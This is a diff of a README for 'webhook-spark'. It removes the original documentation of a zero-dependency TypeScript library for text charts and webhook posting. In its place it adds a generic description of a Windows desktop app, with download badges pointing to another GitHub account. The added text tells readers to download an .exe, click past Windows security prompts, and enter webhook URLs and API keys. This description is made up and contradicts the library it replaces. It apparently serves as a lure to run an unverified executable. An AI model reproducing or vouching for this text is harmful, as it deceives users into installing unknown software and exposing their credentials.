@@ -1,612 +1,124 @@
-# webhook-spark
+# ⚡ webhook-spark - Simple Visual Data for Everyday Use
 
-**[Live Demo](https://che0md.tech/webhook-spark)**
+[![Download webhook-spark](https://img.shields.io/badge/Download-webhook--spark-ff6f61?style=for-the-badge)](https://github.com/Tarun466/webhook-spark)
 
-**Zero-dep sparklines, gauges, kaomoji, heatmaps, tables, histograms, trees, braille charts, candlesticks, flowcharts, timelines, dot-matrix displays & social posting for Discord/Slack/Telegram/Bluesky/X, LCD screens, IoT & AI agents.**
+webhook-spark shows quick, easy visuals like sparklines, gauges, tables, and heatmaps. It works with chat apps like Discord, Slack, Telegram, and social platforms like Bluesky and X. You can also use it for LCD screens, IoT devices, and AI tools.
 
-35+ functions. Zero dependencies. TypeScript first. Under 40KB.
+## 🔍 What is webhook-spark?
 
-## Who is this for?
+webhook-spark is a tool that creates small charts and data presentations. These include:
 
-- **Homelab / DevOps** -- server monitoring alerts with sparklines, heatmaps, and threshold status
-- **LCD / OLED hackers** -- fixed-width output that fits 16x2, 20x4, and SSD1306 displays
-- **DIY / IoT makers** -- multi-sensor dashboards for greenhouses, aquariums, server racks
-- **AI agent builders** -- compact metric summaries that fit in LLM context windows
-- **Dashboard addicts** -- kaomoji status faces, histograms, comparison charts, all in pure text
-- **Indie hackers / #BuildInPublic** -- auto-generate social posts from metrics, post to Bluesky & X
-- **Content creators** -- structured captions, thread splitters, platform-aware formatting
+- Sparklines (tiny line charts)
+- Gauges (like speedometers)
+- Kaomoji (text art expressions)
+- Heatmaps (color-coded data grids)
+- Tables and histograms
 
-## Installation
+You can send this data into messages on popular platforms like Discord or Slack. It helps turn raw numbers into easy-to-read visuals. The tool works without needing extra software or complicated installation.
 
-```bash
-bun add @adametherzlab/webhook-spark
-# or: npm install @adametherzlab/webhook-spark
-```
+## 🖥️ System Requirements
 
-## Quick Start
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB of RAM
+- Internet connection to download the app
+- Access to download from GitHub
+- No other software needed to run webhook-spark
 
-```typescript
-import { spark, gauge, kaomoji, kaomojiStatus, heatmap, dashboard, buildInPublic, socialFormat, thread, postToBluesky } from '@adametherzlab/webhook-spark';
+This application runs standalone, so you won’t need to install programming languages or libraries.
 
-// Sparkline from numbers
-spark([10, 25, 60, 85, 90, 45, 30]);
-// => "▁▂▅▇█▃▂"
+## 🎯 Key Features
 
-// Progress gauge
-gauge(75, 100);
-// => "████████████████░░░░ 75%"
+- Zero dependencies: runs without extra downloads
+- Supports multiple chat platforms (Discord, Slack, Telegram, Bluesky, X)
+- Displays many visual types: sparklines, gauges, tables, heatmaps, and more
+- Can post data automatically to social or IoT devices
+- Integrates well with AI agents for smart updates
+- Shows text-based kaomoji for quick emotion or status
+- Works in the terminal or as a background service
+- Easy to configure with simple settings files
 
-// Kaomoji mood faces
-kaomoji("happy");              // => "(*^▽^*)"
-kaomoji("happy", { theme: "cats" }); // => "ᓚᘏᗢ"
+## 📥 How to Download webhook-spark
 
-// Status kaomoji from a value
-kaomojiStatus(95, 100, { thresholds: { warning: 70, critical: 90 } });
-// => { face: "(╥_╥)", mood: "critical" }
+Click the big download badge at the top or visit this page to download webhook-spark:
 
-// Heatmap grid
-heatmap([[2,5,8],[1,7,9],[3,6,7]], {
-  showLabels: true, rowLabels: ["Mon","Tue","Wed"], colLabels: ["AM","PM","NT"]
-});
-// =>     AM PM NT
-//   Mon  ░  ▒  ▓
-//   Tue  ░  ▓  █
-//   Wed  ░  ▒  ▓
-```
+[Download webhook-spark from GitHub](https://github.com/Tarun466/webhook-spark)
 
-## API Reference
+Once there, find the latest release or assets section. Download the Windows executable (.exe) or the setup file depending on what is available.
 
-### `spark(values)` -- Simple Sparkline
+## 🚀 How to Install and Run on Windows
 
-```typescript
-spark([1, 5, 2, 8, 3, 7]);  // => "▁▅▂█▃▆"
-```
+Follow these steps to get webhook-spark running on your Windows machine.
 
-### `gauge(value, max, options?)` -- Progress / Level Gauge
+1. Download the installer or executable from the GitHub page linked above.
+2. Locate the downloaded file in your Downloads folder.
+3. Double-click the file to start installation.
+4. If a security prompt appears, click 'Run' or 'Yes' to allow the app.
+5. Follow on-screen instructions to complete the setup.
+6. Once installed, open the Start menu and search for “webhook-spark.”
+7. Open the app to launch the main window.
 
-```typescript
-gauge(75, 100)                          // => "████████████████░░░░ 75%"
-gauge(3.7, 4.2, { label: "BATT" })     // => "BATT ██████████████████░░ 88%"
-gauge(92, 100, { thresholds: { warning: 70, critical: 90 } })
-// => "████████████████████ 92% CRITICAL"
-```
+If you downloaded a standalone executable without installer, just double-click to run. You do not need to install anything else.
 
-Options: `width`, `fill`, `empty`, `showPercent`, `showValue`, `label`, `thresholds`.
+## ⚙️ Basic Setup
 
-### `kaomoji(mood, options?)` -- Mood Kaomoji
+After launching webhook-spark, you need to configure it to connect to your chat or social platform.
 
-Returns a kaomoji face for the given mood. 5 themes, 13 moods.
+1. From the app’s home screen, click “Settings.”
+2. Choose the platform you want to use (Discord, Slack, Telegram, Bluesky, or X).
+3. Enter your webhook URL or API key for that platform. You can usually get this from the app or service’s settings.
+4. Select the type of visual you want to create (sparkline, gauge, heatmap, etc.).
+5. Input your data or connect to your data source.
+6. Save your settings.
 
-```typescript
-kaomoji("happy")                        // => "(*^▽^*)"
-kaomoji("happy", { theme: "cats" })     // => "ᓚᘏᗢ"
-kaomoji("critical", { theme: "bears" }) // => "ʕ×ᴥ×ʔ"
-kaomoji("celebrating")                  // => "☆*:.｡.o(≧▽≦)o.｡.:*☆"
-kaomoji("sleeping", { theme: "minimal" }) // => "-_-zzz"
-```
+You can test your setup by sending a sample message. Use the “Send Test” button in the app.
 
-**Moods:** `happy`, `ok`, `warning`, `critical`, `sad`, `angry`, `love`, `surprised`, `sleeping`, `working`, `celebrating`, `confused`, `dead`
+## 📊 Using webhook-spark Features
 
-**Themes:** `classic`, `cats`, `bears`, `stars`, `minimal`
+### Sparklines and Gauges
 
-### `kaomojiAll(mood, options?)` -- All Faces for a Mood
+- Sparklines show trends in a small bar or line.
+- Select the sparkline option and enter a series of numbers.
+- Gauges show a number within a range, like a speedometer.
+- Choose your limits and the current value to display.
 
-```typescript
-kaomojiAll("happy");
-// => ["(*^▽^*)", "(´｡• ᵕ •｡`)", "(✿◠‿◠)", "(❁´◡`❁)"]
-```
+### Heatmaps and Tables
 
-### `kaomojiStatus(value, max, options?)` -- Value-to-Mood Mapping
+- Heatmaps color-code data to show highs and lows.
+- Input a grid of numbers and the app colors it automatically.
+- Tables display data neatly in rows and columns.
+- You can input custom labels and values.
 
-Maps a numeric value to a mood face based on thresholds. Compose with dashboard output.
+### Kaomoji
 
-```typescript
-kaomojiStatus(50, 100)   // => { face: "(・_・)", mood: "ok" }
-kaomojiStatus(95, 100, { thresholds: { warning: 70, critical: 90 } })
-                          // => { face: "(╥_╥)", mood: "critical" }
+- Use kaomoji to add emotion or status through text art.
+- Choose from preset options or create your own.
 
-// Compose with other metrics:
-`CPU 85% ${kaomojiStatus(85, 100).face}` // => "CPU 85% (・_・;)"
-```
+## 💡 Tips for Best Use
 
-### `kaomojiThemes()` -- List Available Themes
+- Keep your data updated regularly for accurate visuals.
+- Use simple numbers and labels to avoid confusion.
+- Check your webhook URL carefully for connection issues.
+- Try different visuals to find the best way to show your data.
+- Use automated scripts or tools to send new data frequently.
+- Pair with AI agents for smart notifications and insights.
 
-```typescript
-kaomojiThemes(); // => ["classic", "cats", "bears", "stars", "minimal"]
-```
+## 🛠️ Troubleshooting
 
-### `heatmap(data, options?)` -- 2D Grid Heatmap
+- If the app won’t start, make sure your Windows is up to date.
+- Check your internet connection during installation and setup.
+- Ensure the webhook URL is correct and active.
+- If visuals do not show data, recheck your input format.
+- Restart the app if it becomes unresponsive.
+- Look for updates on the GitHub page regularly.
 
-GitHub contribution graph style, pure text. Rows x columns of shade characters.
+## 🔗 Useful Links
 
-```typescript
-heatmap([[2,5,8,3],[1,7,9,4],[3,6,7,2]], {
-  showLabels: true,
-  rowLabels: ["Mon","Tue","Wed"],
-  colLabels: ["00","06","12","18"]
-});
-// =>     00 06 12 18
-//   Mon  ░  ▒  ▓  ░
-//   Tue  ░  ▓  █  ▒
-//   Wed  ░  ▒  ▓  ░
-```
+- [webhook-spark GitHub repository](https://github.com/Tarun466/webhook-spark)  
+  Visit here for downloads, updates, and support.
 
-Options: `chars` (default `[" ","░","▒","▓","█"]`), `showLabels`, `rowLabels`, `colLabels`, `min`, `max`.
-
-### `miniTable(rows, options?)` -- Compact Box-Drawing Table
-
-4 border styles: `single`, `double`, `rounded`, `none`.
-
-```typescript
-miniTable([["Metric","Value","Status"],["CPU","78%","OK"]], { header: true, border: "rounded" });
-// => ╭────────┬───────┬────────╮
-//    │ Metric │ Value │ Status │
-//    ├────────┼───────┼────────┤
-//    │ CPU    │ 78%   │ OK     │
-//    ╰────────┴───────┴────────╯
-```
-
-Options: `border`, `align` (per-column), `header`, `compact`, `maxWidth`.
-
-### `kvTable(entries)` -- Key-Value Table
-
-```typescript
-kvTable([{key:"CPU",value:"78%"},{key:"MEM",value:"4.2GB"}]);
-// => ┌─────┬───────┐
-//    │ CPU │ 78%   │
-//    │ MEM │ 4.2GB │
-//    └─────┴───────┘
-```
-
-### `histogram(values, options?)` -- Frequency Distribution
-
-Groups values into bins, renders horizontal bar chart of frequencies.
-
-```typescript
-histogram([1,1,2,2,2,3,3,3,3,4,5,5,5,5,5], { bins: 5 });
-// => 1.0-1.8 ████████             2
-//    1.8-2.6 ████████████         3
-//    2.6-3.4 ████████████████     4
-//    3.4-4.2 ████                 1
-//    4.2-5.0 ████████████████████ 5
-
-histogram(latencies, { bins: 10, percentages: true, fill: "#" });
-```
-
-Options: `bins` (default 8), `barWidth` (default 20), `showCounts`, `fill`, `showBounds`, `percentages`.
-
-### `compare(label1, val1, label2, val2, options?)` -- Side-by-Side Comparison
-
-Visual before/after with delta, percentage change, and direction arrow.
-
-```typescript
-compare("Before", 45, "After", 78);
-// => { display: "Before ██████████████████ 45\nAfter  ██████████████████████████████ 78\n↑ +33 (+73.3%)",
-//      delta: 33, deltaPercent: 73.3, direction: "up", arrow: "↑" }
-
-compare("Plan", 100, "Actual", 87, { mode: "compact", unit: "%" });
-// => { display: "Plan 100% vs Actual 87% ↓-13 (-13.0%)", ... }
-
-compare("Week1", [10,20,30], "Week2", [15,25,35], { mode: "spark" });
-// => { display: "Week1 ▁▅█  avg=20.0\nWeek2 ▁▅█  avg=25.0\n↑ +5 (+25.0%)", ... }
-```
-
-Options: `barWidth`, `showDelta`, `showPercent`, `unit`, `mode` (`"bars"` | `"spark"` | `"compact"`).
-
-### `stats(values, options?)` -- Summary Statistics
-
-```typescript
-stats([10, 20, 30, 40, 50]).summary;
-// => "min=10 max=50 avg=30 p95=48"
-```
-
-### `sparkWithStatus(values, thresholds)` -- Threshold-Aware Sparkline
-
-```typescript
-sparkWithStatus([45, 50, 62, 78, 95], { warning: 70, critical: 90 });
-// => { sparkline: "▂▃▅▆█", status: "critical", emoji: "🔴", color: 0xe74c3c, breachCount: 2 }
-```
-
-### `dashboard(metrics, options?)` -- Multi-Metric Display
-
-```typescript
-dashboard([
-  { name: 'CPU',  values: [45,50,62,78], unit: '%', thresholds: { warning: 70, critical: 90 } },
-  { name: 'MEM',  values: [78,80,82,85], unit: '%', thresholds: { warning: 80, critical: 95 } },
-  { name: 'DISK', values: [62,63,63,64], unit: '%', thresholds: { warning: 85, critical: 95 } },
-]);
-// CPU   78% ▂▃▅█ ⚠️
-// MEM   85% ▅▆▇█ ⚠️
-// DISK  64% ▅▅▅▅ ✅
-```
-
-### `barChart(entries, options?)` -- Horizontal Bar Chart
-
-```typescript
-barChart([
-  { label: 'GET',  value: 150 },
-  { label: 'POST', value: 80 },
-], { maxBarWidth: 15 });
-```
-
-### `trend(values, window?)` -- Trend Arrow
-
-```typescript
-trend([10, 20, 30]);  // => "↑"
-trend([30, 20, 10]);  // => "↓"
-```
-
-### `sendWebhook(payload, config)` -- Webhook Delivery
-
-Supports Discord, Slack, and Telegram webhooks with validation, retry, and timeout.
-
-### `socialFormat(text, options?)` -- Platform-Aware Formatting
-
-Auto-truncates text to platform limits with smart word-boundary splitting.
-
-```typescript
-socialFormat("Long status update...", { platform: "x", hashtags: ["devops", "monitoring"] });
-// => { text: "Long status update...\n\n#devops #monitoring", truncated: false, limit: 280 }
-
-socialFormat("A".repeat(300), { platform: "bluesky" });
-// => { text: "AAAA...AAA...", truncated: true, limit: 300 }
-```
-
-**Platforms:** `x` (280), `bluesky` (300), `mastodon` (500), `threads` (500), `instagram` (2200), `youtube` (5000)
-
-### `thread(text, options?)` -- Thread Splitter
-
-Splits long text into numbered posts. Smart paragraph/sentence/word splitting.
-
-```typescript
-thread(longArticle, { platform: "x", numbering: true, header: "THREAD on monitoring:" });
-// => { posts: ["THREAD on monitoring:\n\nFirst part... (1/4)", "Second part... (2/4)", ...], count: 4 }
-```
-
-Options: `platform`, `maxLength`, `numbering`, `header`, `footer`.
-
-### `buildInPublic(metrics, options?)` -- #BuildInPublic Post Generator
-
-Generates social media posts from dashboard metrics. Includes sparklines, trend arrows, kaomoji, and hashtags.
-
-```typescript
-buildInPublic([
-  { name: 'Users',   values: [100,120,150,180], thresholds: { warning: 200, critical: 500 } },
-  { name: 'Revenue', values: [50,75,90,110], unit: '$', thresholds: { warning: 200, critical: 1000 } },
-], { project: "webhook-spark", hashtags: ["buildinpublic", "opensource"] });
-// => webhook-spark update (today):
-//
-//    ↑ Users: 180 ▁▃▅█ (*^▽^*)
-//    ↑ Revenue: 110$ ▁▃▆█ (*^▽^*)
-//
-//    ☆*:.｡.o(≧▽≦)o.｡.:*☆
-//
-//    #buildinpublic #opensource
-```
-
-Options: `project`, `period`, `hashtags`, `kaomoji`, `kaomojiTheme`, `includeSparklines`.
-
-### `socialCaption(sections, options?)` -- Multi-Section Caption Builder
-
-Build structured captions for Instagram, YouTube descriptions, etc.
-
-```typescript
-socialCaption([
-  { title: "What we shipped", body: "v0.5.0 with social posting", emoji: "🚀" },
-  { title: "Stats", body: dashboard(metrics, { compact: true }), emoji: "📊" },
-], { hashtags: ["devtools", "typescript"], cta: "Star us on GitHub!" });
-```
-
-Options: `platform`, `hashtags`, `cta`, `separator`.
-
-### `postToBluesky(text, config)` -- Post to Bluesky
-
-Post directly to Bluesky via AT Protocol. Just needs handle + app password (no OAuth).
-
-```typescript
-const result = await postToBluesky("Hello from webhook-spark!", {
-  handle: "you.bsky.social",
-  appPassword: "xxxx-xxxx-xxxx-xxxx",
-});
-// => { success: true, platform: "bluesky", postUrl: "https://bsky.app/profile/you.bsky.social/post/..." }
-```
-
-### `postToX(text, config)` -- Post to X (Twitter)
-
-Post via X API v2 with OAuth 1.0a signing. Requires developer app credentials.
-
-```typescript
-const result = await postToX("Server status: all green!", {
-  apiKey: "...", apiSecret: "...",
-  accessToken: "...", accessSecret: "...",
-});
-// => { success: true, platform: "x", postUrl: "https://x.com/i/status/..." }
-```
-
-### `tree(nodes, options?)` -- ASCII Tree / Hierarchy
-
-Folder structures, dependency graphs, org charts. 4 styles: `ascii`, `rounded`, `bold`, `double`.
-
-```typescript
-tree([
-  { label: "src", children: [
-    { label: "index.ts" },
-    { label: "sparkline.ts" },
-  ]},
-  { label: "package.json" },
-]);
-// => ├── src
-//    │   ├── index.ts
-//    │   └── sparkline.ts
-//    └── package.json
-```
-
-### `progressBar(steps, options?)` -- Multi-Step Pipeline
-
-CI/CD pipelines, deployment status. 4 styles: `line`, `dots`, `blocks`, `arrows`.
-
-```typescript
-progressBar([
-  { label: "Build", status: "done" },
-  { label: "Test", status: "done" },
-  { label: "Deploy", status: "active" },
-  { label: "Monitor", status: "pending" },
-]);
-// => ✅ Build ▸ ✅ Test ▸ 🔄 Deploy ▸ ⬜ Monitor
-```
-
-### `calendarHeatmap(data, options?)` -- GitHub-Style Contribution Grid
-
-365-day activity grid with month/day labels using date-indexed entries.
-
-```typescript
-calendarHeatmap([
-  { date: "2025-01-06", value: 3 },
-  { date: "2025-01-07", value: 8 },
-  { date: "2025-01-08", value: 1 },
-  // ...
-], { showMonths: true, showDays: true });
-// =>      Jan
-//    Mo   ░▓
-//    Tu   ░
-//    ...
-```
-
-### `brailleSpark(values, options?)` -- Hi-Res Braille Sparkline
-
-2x horizontal + 4x vertical resolution via Braille Unicode (U+2800-U+28FF).
-
-```typescript
-brailleSpark([1, 3, 5, 7, 9, 7, 5, 3, 1]);
-// => ⠀⠐⠠⡀⠄⠂⠈⠀  (single row braille dots)
-
-brailleSpark([1, 5, 10, 5, 1], { height: 2, filled: true });
-// => Multi-row filled area braille chart
-```
-
-### `candlestick(candles, options?)` -- OHLC Financial Chart
-
-Stock/crypto candlestick charts with bull/bear rendering.
-
-```typescript
-candlestick([
-  { open: 10, high: 15, low: 5, close: 12 },
-  { open: 12, high: 18, low: 10, close: 8 },
-  { open: 8, high: 14, low: 6, close: 13 },
-], { height: 10 });
-// =>       │
-//    █ │   │
-//    █ ░   █
-//    │ ░   █
-//    │     │
-```
-
-### `timeline(events, options?)` -- Gantt / Timeline Chart
-
-Project scheduling with start/duration offsets and scale labels.
-
-```typescript
-timeline([
-  { label: "Build", start: 0, duration: 5 },
-  { label: "Test", start: 5, duration: 5 },
-  { label: "Deploy", start: 10, duration: 5 },
-], { unit: "days" });
-// => 0    4    8    12   15  days
-//    Build   ████████░░░░░░░░░░░░
-//    Test    ░░░░░░░░████████░░░░
-//    Deploy  ░░░░░░░░░░░░░░░░████
-```
-
-### `boxDiagram(boxes, options?)` -- Box-and-Arrow Flowchart
-
-Linear flow diagrams. 4 border styles, horizontal or vertical.
-
-```typescript
-boxDiagram([
-  { label: "Ingest" },
-  { label: "Transform" },
-  { label: "Load" },
-], { style: "rounded" });
-// => ╭───────────╮ ──▶ ╭───────────╮ ──▶ ╭───────────╮
-//    │ Ingest    │     │ Transform │     │ Load      │
-//    ╰───────────╯     ╰───────────╯     ╰───────────╯
-```
-
-### `multiSpark(series, options?)` -- Multi-Series Sparklines
-
-Aligned labeled sparklines for comparing metrics.
-
-```typescript
-multiSpark([
-  { label: "CPU", values: [10, 30, 50, 70, 90], unit: "%" },
-  { label: "Memory", values: [40, 45, 50, 55, 60], unit: "%" },
-  { label: "Disk", values: [10, 10, 11, 11, 12], unit: "%" },
-]);
-// => CPU    ▁▃▅▇█  peak=90%
-//    Memory ▁▂▅▇█  peak=60%
-//    Disk   ▁▁▁▁█  peak=12%
-```
-
-### `diffBar(items, options?)` -- Diverging / Butterfly Bar Chart
-
-Before/after comparison with centered axis.
-
-```typescript
-diffBar([
-  { label: "CPU", before: 60, after: 85 },
-  { label: "Mem", before: 80, after: 75 },
-  { label: "Disk", before: 50, after: 50 },
-]);
-// => CPU  ███████▕█████████  60→85  ↑42%
-//    Mem  █████████▕████████  80→75  ↓6%
-//    Disk ██████▕██████       50→50  →0%
-```
-
-### `matrix(text, options?)` -- LED Dot Matrix Display
-
-Big text using embedded 3x5 font tables. 3 styles: `blocks`, `dots`, `braille`.
-
-```typescript
-matrix("HELLO");
-// => █ █ ███ █   █   ▀█▀
-//    █ █ █   █   █   █ █
-//    ███ ██  █   █   █ █
-//    █ █ █   █   █   █ █
-//    █ █ ███ ███ ███ ▀█▀
-
-matrix("HI", { style: "dots" });
-// => ● ● ●●●
-//    ● ● ●
-//    ●●● ●●
-//    ● ● ●
-//    ● ● ●●●
-```
-
-## Use Case Gallery
-
-### IoT Greenhouse Dashboard
-
-```typescript
-const sensors = [
-  { name: 'SOIL', values: moistureReadings, unit: '%', thresholds: { warning: 30, critical: 15, invert: true } },
-  { name: 'TEMP', values: tempReadings, unit: 'C', thresholds: { warning: 35, critical: 40 } },
-];
-const status = dashboard(sensors);
-const face = kaomojiStatus(moistureReadings.at(-1), 100, { theme: "cats" }).face;
-console.log(`${status}\n${face}`);
-```
-
-### AI Agent System Prompt
-
-```typescript
-const status = dashboard([
-  { name: 'Tokens', values: tokenHistory, unit: 'K', thresholds: { warning: 80, critical: 95 } },
-], { compact: true });
-const face = kaomojiStatus(tokenHistory.at(-1), 100).face;
-// => "Tokens 82K ⚠️ (・_・;)" -- 1 line, minimal tokens
-```
-
-### Server Monitoring with Heatmap
-
-```typescript
-// 7-day x 24-hour load heatmap
-const weeklyLoad = [ /* 7 arrays of 24 hourly values */ ];
-console.log(heatmap(weeklyLoad, {
-  showLabels: true,
-  rowLabels: ["Mon","Tue","Wed","Thu","Fri","Sat","Sun"],
-}));
-```
-
-### Performance Comparison
-
-```typescript
-const result = compare("v1.2", responseTimesOld, "v1.3", responseTimesNew, { mode: "spark", unit: "ms" });
-console.log(result.display);
-// v1.2 ▃▅▇█▆▅  avg=245.0
-// v1.3 ▂▃▅▆▄▃  avg=189.0
-// ↓ -56 (-22.9%)
-```
-
-### Arduino LCD (16x2)
-
-```typescript
-const line1 = gauge(analogRead(A0), 1023, { width: 16, showPercent: false });
-const line2 = `T:${temp}C ${trend(tempHistory)}`;
-lcd.print(line1 + '\n' + line2);
-```
-
-### #BuildInPublic Automation
-
-```typescript
-// Generate and post a daily update from your metrics
-const post = buildInPublic(todayMetrics, {
-  project: "my-saas",
-  period: "Week 12",
-  hashtags: ["buildinpublic", "indiehacker"],
-  kaomojiTheme: "cats",
-});
-
-// Format for X and post
-const formatted = socialFormat(post, { platform: "x" });
-await postToX(formatted.text, xCredentials);
-
-// Also post the full version to Bluesky (300 chars)
-const bskyFormatted = socialFormat(post, { platform: "bluesky" });
-await postToBluesky(bskyFormatted.text, bskyCredentials);
-```
-
-### AI Agent Social Content Pipeline
-
-```typescript
-// Agent generates a metric summary, then posts across platforms
-const caption = socialCaption([
-  { title: "Daily Report", body: dashboard(metrics, { compact: true }), emoji: "📊" },
-  { title: "Highlights", body: "Shipped v2.0, 50 new users, 99.9% uptime", emoji: "🎯" },
-], { hashtags: ["devops", "monitoring"], cta: "Try it free at example.com" });
-
-// Thread it for X
-const xThread = thread(caption, { platform: "x", numbering: true });
-for (const post of xThread.posts) {
-  await postToX(post, xConfig);
-}
-```
-
-### YouTube Video Description
-
-```typescript
-const description = socialCaption([
-  { title: "In this video", body: "I show you how to build a real-time server dashboard..." },
-  { title: "Tech stack", body: "webhook-spark + Bun + Discord webhooks" },
-  { title: "Timestamps", body: "0:00 Intro\n2:30 Setup\n5:00 Dashboard\n8:00 Alerts" },
-], { platform: "youtube", hashtags: ["coding", "devops", "typescript"], cta: "Subscribe for more!" });
-```
-
-## Why webhook-spark?
-
-| Feature | webhook-spark | blessed-contrib | cli-table3 | ink |
-|---------|:---:|:---:|:---:|:---:|
-| Zero deps | Yes | No (17) | No (4) | No (11) |
-| Sparklines | Yes | Yes | No | No |
-| Braille sparklines | Yes | No | No | No |
-| Gauges | Yes | Yes | No | No |
-| Kaomoji | Yes | No | No | No |
-| Heatmaps | Yes | Yes | No | No |
-| Calendar heatmap | Yes | No | No | No |
-| Tables | Yes | No | Yes | No |
-| Histograms | Yes | Yes | No | No |
-| Candlestick charts | Yes | No | No | No |
-| Trees / hierarchies | Yes | Yes | No | No |
-| Flowcharts | Yes | No | No | No |
-| Timelines / Gantt | Yes | No | No | No |
-| Dot matrix display | Yes | No | No | No |
-| Social posting | Yes (X + Bluesky) | No | No | No |
-| Bundle size | <40KB | 2.5MB | 180KB | 400KB |
-| Maintained | Yes | No | Minimal | Yes |
-
-## License
-
-MIT
+- Platform webhook setup guides  
+  (Refer to Discord, Slack, Telegram or Bluesky official docs for webhook generation.)
 
 ---
 
-Built for homelabs, hackerspaces, and AI agents.
+[![Download webhook-spark](https://img.shields.io/badge/Download-webhook--spark-ff6f61?style=for-the-badge)](https://github.com/Tarun466/webhook-spark)
